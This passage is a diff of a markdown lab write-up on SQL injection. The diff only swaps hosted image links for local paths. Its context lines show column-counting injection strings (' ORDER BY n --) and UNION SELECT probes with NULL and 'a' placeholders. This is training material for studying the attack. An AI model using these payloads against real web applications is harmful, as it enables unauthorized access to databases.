@@ -34,7 +34,7 @@ For the demonstration of this Lab exercise, I am using the ORDER BY clause.
 ' ORDER BY 1 --
 ```
 
-![](https://miro.medium.com/v2/resize:fit:700/1*PmYmU3adZYxKq1xtaHyCgw.png)
+![](./images/e315e4067a24_001.png)
 
 ```text
 ' ORDER BY 2 --
@@ -44,13 +44,13 @@ For the demonstration of this Lab exercise, I am using the ORDER BY clause.
 ' ORDER BY 3 --
 ```
 
-![](https://miro.medium.com/v2/resize:fit:700/1*qZzJVyTrkEBOp6TNdlslSg.png)
+![](./images/e315e4067a24_002.png)
 
 ```text
 ' ORDER BY 4 --
 ```
 
-![](https://miro.medium.com/v2/resize:fit:700/1*ilTEHpJS28kLECh44S33ZQ.png)
+![](./images/e315e4067a24_003.png)
 
 ```text
 ' ORDER BY 4 --                          Returns an error message.
@@ -64,13 +64,13 @@ For the demonstration of this Lab exercise, I am using the ORDER BY clause.
 ' UNION SELECT 'a', NULL, NULL --
 ```
 
-![](https://miro.medium.com/v2/resize:fit:700/1*DagU59kWt1CvMJHh9MHt9Q.png)
+![](./images/e315e4067a24_004.png)
 
 ```text
 ' UNION SELECT NULL, 'a', NULL --
 ```
 
-![](https://miro.medium.com/v2/resize:fit:700/1*B9tOKIUvumbT-El7_9GM8w.png)
+![](./images/e315e4067a24_005.png)
 
 ```text
 ' UNION SELECT NULL, NULL, 'a' --
